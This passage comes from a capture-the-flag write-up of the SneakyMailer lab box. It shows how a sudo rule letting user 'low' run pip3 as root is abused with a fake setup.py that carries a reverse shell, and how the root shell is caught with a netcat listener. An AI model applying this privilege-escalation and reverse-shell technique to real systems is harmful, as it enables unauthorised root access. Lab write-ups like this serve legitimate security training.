The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jul 21 04:17:42 2020 from 10.10.15.51
low@sneakymailer:~$ cat user.txt
```

### 12. Look at permissions
During my early enumeration I do a sudo -l.
```bash
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```
The user can run pip3 as root. I already know pip3 is the package manager for pip3, and performs similar functions as pypi. I figured it could probably install custom packages as well, probably also using custom setup scripts. So the path here was probably similar to what I just did earlier. A bit of light googling confirms that pip3 can indeed run packages with setup.py. So now I just have to craft a new setup.py.

### 13. Elevate priliges
Firstly I create a setup.py script (see setup.py). This can be a lot simpler as I only need to execute /bin/bash as root, and I'm not so concerned about the setup failing to execute. On github I found a fake setup.py file with the reverse shell code all ready to go: https://github.com/0x00-0x00/FakePip.  
I start a listener on my machine and execute the command to install the package with pip3 as root.
```bash
low@sneakymailer:~/.local/share/nano/.config/.cgf$ sudo pip3 install .
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /home/low/.local/share/nano/.config/.cgf
Building wheels for collected packages: FakePip
  Running setup.py bdist_wheel for FakePip ... -
```
Catch the shell.
```bash
ali@kali:~$ nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on sneakycorp.htb 33980
root@sneakymailer:/tmp/pip-req-build-k_4omm3o# whoami
whoami
root
```